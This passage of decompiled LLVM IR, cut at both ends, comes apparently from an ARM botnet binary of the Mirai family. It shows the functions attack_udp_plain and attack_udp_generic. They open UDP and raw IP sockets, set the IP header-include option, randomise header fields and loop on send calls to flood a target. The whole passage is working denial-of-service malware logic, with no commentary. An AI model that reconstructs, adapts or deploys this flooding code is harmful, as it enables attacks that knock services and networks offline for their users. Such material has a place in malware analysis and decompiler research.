  uselistorder i32 %v3_b120, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b10c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_b060, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v7_b048, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_afd4, { 1, 0 }
  uselistorder i32 %v6_afcc, { 1, 0 }
  uselistorder i32 %v8_afb4, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b5f8, { 1, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b470, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b3f4, { 1, 0 }
  uselistorder label %dec_label_pc_b3e4, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_b608 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b624 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_b624, i32* @sl, align 4
  %v0_b630 = load i32, i32* @r7, align 4
  %v2_b634 = call i32 @calloc(i32 %v0_b630, i32 4)
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* @r4, align 4
  %v0_b640 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_b634, i32* @r8, align 4
  %v0_b650 = load i32, i32* @r5, align 4
  %v6_b654 = inttoptr i32 %v0_b640 to i32*
  %v7_b654 = call i32 @attack_get_opt_int(i32 %v0_b650, i32* %v6_b654, i32 7, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 ptrtoint (i32* @0 to i32))
  %v3_b65c = urem i32 %v7_b654, 65536
  %v0_b660 = load i32, i32* @r6, align 4
  %v0_b668 = load i32, i32* @r4, align 4
  store i32 %v0_b668, i32* %r3.global-to-local, align 4
  %v0_b66c = load i32, i32* @r5, align 4
  %sext = mul i32 %v0_b668, 65536
  %v4_b674 = sdiv i32 %sext, 65536
  %v6_b674 = inttoptr i32 %v0_b660 to i32*
  %v7_b674 = call i32 @attack_get_opt_int(i32 %v0_b66c, i32* %v6_b674, i32 6, i32 %v4_b674, i32 %v3_b65c)
  %v0_b678 = load i32, i32* @r6, align 4
  %v3_b67c = mul i32 %v7_b674, 65536
  store i32 %v3_b67c, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_b688 = load i32, i32* @r5, align 4
  %v5_b68c = inttoptr i32 %v0_b678 to i32*
  %v6_b68c = call i32 @attack_get_opt_int(i32 %v0_b688, i32* %v5_b68c, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b69c = load i32, i32* @r6, align 4
  %v0_b6a0 = load i32, i32* @r5, align 4
  %v3_b6a4 = urem i32 %v6_b68c, 65536
  store i32 %v3_b6a4, i32* @r5, align 4
  %v5_b6a8 = inttoptr i32 %v0_b69c to i32*
  %v6_b6a8 = call i32 @attack_get_opt_int(i32 %v0_b6a0, i32* %v5_b6a8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_b6ac = load i32, i32* %sb.global-to-local, align 4
  %v3_b6ac = udiv i32 %v0_b6ac, 65536
  store i32 %v3_b6ac, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b6b4 = load i32, i32* @r4, align 4
  %v9_b6b4 = icmp eq i32 %v3_b6ac, %v1_b6b4
  br i1 %v9_b6b4, label %dec_label_pc_b6e4, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_b6cc = udiv i32 %v0_b6ac, 16777216
  store i32 %v4_b6cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b6f4

dec_label_pc_b6e4:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_b6e4 = call i32 @rand_next()
  br label %dec_label_pc_b6f4

dec_label_pc_b6f4:                                ; preds = %bb, %dec_label_pc_b6e4
  %v0_b6d810 = urem i32 %v6_b6a8, 256
  %v0_b6f4 = load i32, i32* @r7, align 4
  %v2_b6f4 = icmp eq i32 %v0_b6f4, 0
  br i1 %v2_b6f4, label %dec_label_pc_b834, label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b6f4
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_b7a8 = udiv i32 %v3_b65c, 256
  %v1_b7a4 = mul i32 %v7_b654, 256
  %v4_b7ac = and i32 %v1_b7a4, 65280
  %v5_b7ac = or i32 %v4_b7ac, %v3_b7a8
  %v2_b72c = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_b78c

dec_label_pc_b70c:                                ; preds = %bb51, %dec_label_pc_b7cc
  %v3_b718 = call i32 @socket(i32 2, i32 2, i32 17)
  %v7_b720 = icmp eq i32 %v3_b718, -1
  %v0_b724 = load i32, i32* @sb, align 4
  %v1_b724 = add i32 %v0_b724, 1
  store i32 %v1_b724, i32* @sb, align 4
  %v0_b728 = load i32, i32* @fp, align 4
  %v1_b728 = add i32 %v0_b728, 24
  store i32 %v1_b728, i32* @fp, align 4
  %v2_b734 = load i32, i32* @r8, align 4
  %v3_b734 = add i32 %v2_b734, %stack_var_-60.0
  %v4_b734 = inttoptr i32 %v3_b734 to i32*
  store i32 %v3_b718, i32* %v4_b734, align 4
  br i1 %v7_b720, label %dec_label_pc_b828, label %dec_label_pc_b73c

dec_label_pc_b73c:                                ; preds = %dec_label_pc_b70c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_b754 = call i32 @bind(i32 %v3_b718, i32 %v2_b72c, i32 16)
  %v0_b758 = load i32, i32* @r6, align 4
  %v1_b758 = add i32 %v0_b758, 20
  %v2_b758 = inttoptr i32 %v1_b758 to i8*
  %v3_b758 = load i8, i8* %v2_b758, align 1
  %v4_b758 = zext i8 %v3_b758 to i32
  store i32 %v4_b758, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_b758, 32
  br i1 %tmp, label %dec_label_pc_b7e0, label %dec_label_pc_b764

dec_label_pc_b764:                                ; preds = %dec_label_pc_b73c, %dec_label_pc_b7e0
  %v0_b768 = phi i32 [ %v0_b758, %dec_label_pc_b73c ], [ %v0_b768.pre, %dec_label_pc_b7e0 ]
  %v1_b76c = load i32, i32* @r8, align 4
  %v2_b76c = add i32 %v1_b76c, %stack_var_-60.0
  %v3_b76c = inttoptr i32 %v2_b76c to i32*
  %v4_b76c = load i32, i32* %v3_b76c, align 4
  %v3_b774 = call i32 @__libc_connect(i32 %v4_b76c, i32 %v0_b768, i32 16)
  %v0_b77c = load i32, i32* @sb, align 4
  %v1_b77c = load i32, i32* @r7, align 4
  %v9_b77c = icmp eq i32 %v0_b77c, %v1_b77c
  %v1_b780 = add i32 %stack_var_-60.0, 4
  store i32 %v1_b780, i32* %r3.global-to-local, align 4
  br i1 %v9_b77c, label %dec_label_pc_b834, label %dec_label_pc_b78c

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6fc
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_b6fc ], [ %v1_b780, %dec_label_pc_b764 ]
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* @r4, align 4
  %v3_b79c = call i32 @calloc(i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 1)
  store i32 %v5_b7ac, i32* %r3.global-to-local, align 4
  %v1_b7b8 = load i32, i32* @r4, align 4
  %v9_b7b8 = icmp eq i32 %v3_b65c, %v1_b7b8
  %v1_b7bc = load i32, i32* @fp, align 4
  %v2_b7bc = add i32 %v1_b7bc, %arg2
  store i32 %v2_b7bc, i32* @r6, align 4
  %v2_b7c0 = load i32, i32* @sl, align 4
  %v3_b7c0 = add i32 %v2_b7c0, %stack_var_-60.0
  %v4_b7c0 = inttoptr i32 %v3_b7c0 to i32*
  store i32 %v3_b79c, i32* %v4_b7c0, align 4
  br i1 %v9_b7b8, label %dec_label_pc_b7cc, label %bb51

bb51:                                             ; preds = %dec_label_pc_b78c
  %v1_b7c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_b7c4 = trunc i32 %v1_b7c4 to i16
  %v3_b7c4 = load i32, i32* @r6, align 4
  %v4_b7c4 = add i32 %v3_b7c4, 2
  %v5_b7c4 = inttoptr i32 %v4_b7c4 to i16*
  store i16 %v2_b7c4, i16* %v5_b7c4, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7cc:                                ; preds = %dec_label_pc_b78c
  %v0_b7cc = call i32 @rand_next()
  %v1_b7cc = trunc i32 %v0_b7cc to i16
  %v0_b7d4 = load i32, i32* @fp, align 4
  %v2_b7d4 = add i32 %v0_b7d4, %arg2
  store i32 %v2_b7d4, i32* @r6, align 4
  %v4_b7d8 = add i32 %v2_b7d4, 2
  %v5_b7d8 = inttoptr i32 %v4_b7d8 to i16*
  store i16 %v1_b7cc, i16* %v5_b7d8, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7e0:                                ; preds = %dec_label_pc_b73c
  %v1_b7e0 = add i32 %v0_b758, 16
  %v2_b7e0 = inttoptr i32 %v1_b7e0 to i32*
  %v3_b7e0 = load i32, i32* %v2_b7e0, align 4
  store i32 %v3_b7e0, i32* @r4, align 4
  %v0_b7e4 = call i32 @rand_next()
  %v0_b7e8 = load i32, i32* @r4, align 4
  %v1_b7e8 = and i32 %v0_b7e8, 16711680
  %v3_b7ec = udiv i32 %v0_b7e8, 16777216
  %v4_b7f0 = udiv i32 %v1_b7e8, 256
  %v5_b7f0 = or i32 %v4_b7f0, %v3_b7ec
  %v1_b7f4 = and i32 %v0_b7e8, ptrtoint (i32* @global_var_ff00.34 to i32)
  store i32 %v1_b7f4, i32* %r3.global-to-local, align 4
  %v4_b7f8 = mul i32 %v1_b7f4, 256
  %v5_b7f8 = or i32 %v5_b7f0, %v4_b7f8
  %v0_b7fc = load i32, i32* @r6, align 4
  %v1_b7fc = add i32 %v0_b7fc, 20
  %v2_b7fc = inttoptr i32 %v1_b7fc to i8*
  %v3_b7fc = load i8, i8* %v2_b7fc, align 1
  %v4_b7fc = zext i8 %v3_b7fc to i32
  %v4_b800 = mul i32 %v0_b7e8, 16777216
  %v5_b800 = or i32 %v5_b7f8, %v4_b800
  %v7_b804 = lshr i32 %v0_b7e4, %v4_b7fc
  %v8_b804 = add i32 %v7_b804, %v5_b800
  %v5_b81c = call i32 @llvm.bswap.i32(i32 %v8_b804)
  store i32 %v5_b81c, i32* %r3.global-to-local, align 4
  %v2_b820 = add i32 %v0_b7fc, 4
  %v3_b820 = inttoptr i32 %v2_b820 to i32*
  store i32 %v5_b81c, i32* %v3_b820, align 4
  %v0_b768.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b764

dec_label_pc_b828:                                ; preds = %dec_label_pc_b70c
  store i32 %v18_b608, i32* %sb.global-to-local, align 4
  ret i32 %v3_b718

dec_label_pc_b834:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6f4
  %v1_b87422 = phi i32 [ 0, %dec_label_pc_b6f4 ], [ %v0_b77c, %dec_label_pc_b764 ]
  %v2_b838 = icmp eq i32 %v0_b6d810, 0
  br i1 %v2_b838, label %dec_label_pc_b858.outer, label %dec_label_pc_b870

dec_label_pc_b848:                                ; preds = %dec_label_pc_b858
  store i32 %v1_b84c, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b848 = load i32, i32* @r8, align 4
  %v4_b848 = mul i32 %v1_b84c, 4
  %v5_b848 = add i32 %v0_b848, %v4_b848
  %v6_b848 = inttoptr i32 %v5_b848 to i32*
  %v7_b848 = load i32, i32* %v6_b848, align 4
  %v0_b84c = load i32, i32* @sl, align 4
  %v5_b84c = add i32 %v0_b84c, %v4_b848
  %v6_b84c = inttoptr i32 %v5_b84c to i32*
  %v7_b84c = load i32, i32* %v6_b84c, align 4
  %v4_b850 = call i32 @__libc_send(i32 %v7_b848, i32 %v7_b84c, i32 %v0_b85c, i32 16384)
  %v0_b854 = load i32, i32* @r4, align 4
  %v1_b854 = add i32 %v0_b854, 1
  %v0_b858.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b858.outer

dec_label_pc_b858.outer:                          ; preds = %dec_label_pc_b834, %dec_label_pc_b848
  %v0_b858.ph = phi i32 [ %v0_b858.pre.pre, %dec_label_pc_b848 ], [ %v1_b87422, %dec_label_pc_b834 ]
  %v1_b84c.ph = phi i32 [ %v1_b854, %dec_label_pc_b848 ], [ 0, %dec_label_pc_b834 ]
  %v0_b85c = load i32, i32* @r5, align 4
  br label %dec_label_pc_b858

dec_label_pc_b858:                                ; preds = %dec_label_pc_b858.outer, %dec_label_pc_b858
  %v1_b84c = phi i32 [ 0, %dec_label_pc_b858 ], [ %v1_b84c.ph, %dec_label_pc_b858.outer ]
  %v8_b864 = icmp sgt i32 %v0_b858.ph, %v1_b84c
  br i1 %v8_b864, label %dec_label_pc_b848, label %dec_label_pc_b858

dec_label_pc_b870:                                ; preds = %dec_label_pc_b874, %dec_label_pc_b834
  %v1_b87421 = phi i32 [ %v1_b87422, %dec_label_pc_b834 ], [ %v1_b874, %dec_label_pc_b874 ]
  br label %dec_label_pc_b874

dec_label_pc_b874:                                ; preds = %dec_label_pc_b880, %dec_label_pc_b870
  %v1_b874 = phi i32 [ %v1_b87421, %dec_label_pc_b870 ], [ %v1_b874.pre, %dec_label_pc_b880 ]
  %v1_b880 = phi i32 [ 0, %dec_label_pc_b870 ], [ %v1_b8a0, %dec_label_pc_b880 ]
  store i32 %v1_b880, i32* @r6, align 4
  %v6_b87c = icmp slt i32 %v1_b880, %v1_b874
  br i1 %v6_b87c, label %dec_label_pc_b880, label %dec_label_pc_b870

dec_label_pc_b880:                                ; preds = %dec_label_pc_b874
  %v0_b878 = load i32, i32* @r5, align 4
  %v0_b880 = load i32, i32* @sl, align 4
  %v4_b880 = mul i32 %v1_b880, 4
  %v5_b880 = add i32 %v0_b880, %v4_b880
  %v6_b880 = inttoptr i32 %v5_b880 to i32*
  %v7_b880 = load i32, i32* %v6_b880, align 4
  store i32 %v7_b880, i32* @r4, align 4
  store i32 %v7_b880, i32* @r0, align 4
  %v2_b888 = call i32 @rand_str(i32 %v7_b880, i32 %v0_b878)
  %v0_b88c = load i32, i32* @r8, align 4
  %v1_b88c = load i32, i32* @r6, align 4
  %v4_b88c = mul i32 %v1_b88c, 4
  %v5_b88c = add i32 %v4_b88c, %v0_b88c
  %v6_b88c = inttoptr i32 %v5_b88c to i32*
  %v7_b88c = load i32, i32* %v6_b88c, align 4
  %v0_b890 = load i32, i32* @r4, align 4
  %v0_b894 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_b89c = call i32 @__libc_send(i32 %v7_b88c, i32 %v0_b890, i32 %v0_b894, i32 16384)
  %v0_b8a0 = load i32, i32* @r6, align 4
  %v1_b8a0 = add i32 %v0_b8a0, 1
  %v1_b874.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b874

; uselistorder directives
  uselistorder i32 %v1_b874, { 1, 0 }
  uselistorder i32 %v1_b84c, { 2, 1, 0 }
  uselistorder i32 %v5_b81c, { 1, 0 }
  uselistorder i32 %v0_b7e8, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_b758, { 1, 0, 2 }
  uselistorder i32 %v3_b718, { 1, 3, 2, 0 }
  uselistorder i32 %v3_b6ac, { 1, 0 }
  uselistorder i32 %v3_b65c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 15, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b858, { 1, 0 }
  uselistorder label %dec_label_pc_b858.outer, { 1, 0 }
  uselistorder label %dec_label_pc_b764, { 1, 0 }
  uselistorder label %dec_label_pc_b70c, { 1, 0 }
  uselistorder label %dec_label_pc_b6f4, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_b8a8 = load i32, i32* @sb, align 4
  %v27_b8a8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b8c4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_b8c8 = load i32, i32* @r5, align 4
  store i32 %v0_b8c8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b8d8 = load i32, i32* @r4, align 4
  store i32 %v0_b8d8, i32* %r0.global-to-local, align 4
  %v5_b8dc = inttoptr i32 %v0_b8c8 to i32*
  %v6_b8dc = call i32 @attack_get_opt_int(i32 %v0_b8d8, i32* %v5_b8dc, i32 2, i32 0, i32 %v2_b8c4)
  %v1_b8e8 = urem i32 %v6_b8dc, 256
  store i32 %v1_b8e8, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b8f4 = load i32, i32* @r5, align 4
  store i32 %v0_b8f4, i32* %r1.global-to-local, align 4
  %v0_b8f8 = load i32, i32* @r4, align 4
  store i32 %v0_b8f8, i32* %r0.global-to-local, align 4
  %v5_b8fc = trunc i32 %v6_b8dc to i8
  %v7_b900 = inttoptr i32 %v0_b8f4 to i32*
  %v8_b900 = call i32 @attack_get_opt_int(i32 %v0_b8f8, i32* %v7_b900, i32 3, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v6_b8dc)
  %v0_b904 = load i32, i32* @r5, align 4
  store i32 %v0_b904, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_b914 = load i32, i32* @r4, align 4
  store i32 %v0_b914, i32* %r0.global-to-local, align 4
  %v5_b918 = inttoptr i32 %v0_b904 to i32*
  %v6_b918 = call i32 @attack_get_opt_int(i32 %v0_b914, i32* %v5_b918, i32 4, i32 64, i32 %v8_b900)
  %v1_b920 = urem i32 %v6_b918, 256
  store i32 %v1_b920, i32* %ip.global-to-local, align 4
  %v0_b924 = load i32, i32* @r5, align 4
  store i32 %v0_b924, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b930 = load i32, i32* @r4, align 4
  store i32 %v0_b930, i32* %r0.global-to-local, align 4
  %v6_b938 = inttoptr i32 %v0_b924 to i32*
  %v7_b938 = call i32 @attack_get_opt_int(i32 %v0_b930, i32* %v6_b938, i32 5, i32 0, i32 %v1_b920)
  %v1_b944 = urem i32 %v7_b938, 256
  store i32 %v1_b944, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b950 = load i32, i32* @r5, align 4
  store i32 %v0_b950, i32* %r1.global-to-local, align 4
  %v0_b954 = load i32, i32* @r4, align 4
  store i32 %v0_b954, i32* %r0.global-to-local, align 4
  %v6_b95c = inttoptr i32 %v0_b950 to i32*
  %v7_b95c = call i32 @attack_get_opt_int(i32 %v0_b954, i32* %v6_b95c, i32 6, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v1_b944)
  %v0_b964 = load i32, i32* @r5, align 4
  store i32 %v0_b964, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v7_b95c, i32* %sb.global-to-local, align 4
  %v0_b974 = load i32, i32* @r4, align 4
  store i32 %v0_b974, i32* %r0.global-to-local, align 4
  %v6_b978 = inttoptr i32 %v0_b964 to i32*
  %v7_b978 = call i32 @attack_get_opt_int(i32 %v0_b974, i32* %v6_b978, i32 7, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_b97c = load i32, i32* @r5, align 4
  store i32 %v0_b97c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v7_b978, i32* @sl, align 4
  %v0_b98c = load i32, i32* @r4, align 4
  store i32 %v0_b98c, i32* %r0.global-to-local, align 4
  %v5_b990 = inttoptr i32 %v0_b97c to i32*
  %v6_b990 = call i32 @attack_get_opt_int(i32 %v0_b98c, i32* %v5_b990, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b99c = load i32, i32* @r5, align 4
  store i32 %v0_b99c, i32* %r1.global-to-local, align 4
  store i32 %v6_b990, i32* @r6, align 4
  %v0_b9a4 = load i32, i32* @r4, align 4
  store i32 %v0_b9a4, i32* %r0.global-to-local, align 4
  %v5_b9a8 = inttoptr i32 %v0_b99c to i32*
  %v6_b9a8 = call i32 @attack_get_opt_int(i32 %v0_b9a4, i32* %v5_b9a8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_b9b4 = load i32, i32* @global_var_24f10.62, align 4
  store i32 %v2_b9b4, i32* %r3.global-to-local, align 4
  %v1_b9b8 = urem i32 %v6_b9a8, 256
  store i32 %v1_b9b8, i32* %ip.global-to-local, align 4
  %v0_b9bc = load i32, i32* @r5, align 4
  store i32 %v0_b9bc, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b9c4 = load i32, i32* @r4, align 4
  store i32 %v0_b9c4, i32* %r0.global-to-local, align 4
  %v5_b9cc = inttoptr i32 %v0_b9bc to i32*
  %v6_b9cc = call i32 @attack_get_opt_int(i32 %v0_b9c4, i32* %v5_b9cc, i32 25, i32 %v2_b9b4, i32 %v1_b9b8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b9e0 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_b9e0, i32* %r0.global-to-local, align 4
  %v7_b9e4 = icmp eq i32 %v3_b9e0, -1
  store i1 %v7_b9e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b9e0, i32* @fp, align 4
  br i1 %v7_b9e4, label %dec_label_pc_bd84, label %dec_label_pc_b9f0

dec_label_pc_b9f0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b9f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b9f8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ba0c = call i32 @__GI_setsockopt(i32 %v3_b9e0, i32 0, i32 3, i32 %v6_b9f8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ba0c, i32* %r0.global-to-local, align 4
  %v7_ba10 = icmp eq i32 %v5_ba0c, -1
  store i1 %v7_ba10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ba10, label %dec_label_pc_bd7c, label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_b9f0
  %v0_ba18 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ba24 = urem i32 %v0_ba18, 65536
  store i32 %v3_ba24, i32* %r2.global-to-local, align 4
  %v3_ba28 = icmp ugt i32 %v3_ba24, 1459
  %v9_ba28 = icmp eq i32 %v3_ba24, 1460
  store i1 %v9_ba28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ba28, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_ba18
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_ba18, %bb
  %v0_ba84 = phi i32 [ %v3_ba24, %dec_label_pc_ba18 ], [ 1460, %bb ]
  store i32 %v8_b900, i32* %r0.global-to-local, align 4
  %v0_ba34 = load i32, i32* %sb.global-to-local, align 4
  %v3_ba3c = urem i32 %v0_ba34, 65536
  store i32 %v3_ba3c, i32* %ip.global-to-local, align 4
  %v0_ba40 = load i32, i32* @r7, align 4
  %v2_ba40 = icmp eq i32 %v0_ba40, 0
  store i1 %v2_ba40, i1* %cpsr_z.global-to-local, align 1
  %v0_ba44 = load i32, i32* @sl, align 4
  %v3_ba44 = mul i32 %v0_ba44, 65536
  br i1 %v2_ba40, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_ba84, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_ba74 = phi i32 [ %v3_ba3c, %bb48 ], [ %v0_ba84, %bb49 ]
  %v3_ba54 = urem i32 %v0_ba44, 65536
  store i32 %v3_ba54, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ba5c = urem i32 %v8_b900, 65536
  store i32 %v3_ba5c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba40, label %.thread, label %dec_label_pc_ba7c

.thread:                                          ; preds = %bb50
  %v2_ba70 = add nsw i32 %v1_ba74, 28
  store i32 %v2_ba70, i32* @sb, align 4
  %v2_ba74 = add nsw i32 %v1_ba74, 8
  store i32 %v2_ba74, i32* @sl, align 4
  br label %dec_label_pc_bba0.preheader

dec_label_pc_ba7c:                                ; preds = %bb50
  %v1_ba84 = add nuw nsw i32 %v0_ba84, 28
  store i32 %v1_ba84, i32* @sb, align 4
  %v1_ba88 = add nuw nsw i32 %v0_ba84, 8
  store i32 %v1_ba88, i32* @sl, align 4
  %tmp51 = mul i32 %v0_ba34, 256
  %v3_ba9c = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_ba34, 256
  %v4_baac = urem i32 %tmp52, 256
  %v5_baac = or i32 %v4_baac, %v3_ba9c
  store i32 %v5_baac, i32* @r6, align 4
  store i32 %v3_ba44, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_ba84, 256
  %v3_bab8 = and i32 %tmp53, 65280
  store i32 %v3_bab8, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_ba44, 256
  %v3_babc = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_ba88, 256
  %v3_bac0 = and i32 %tmp55, 65280
  store i32 %v3_bac0, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_ba84, 256
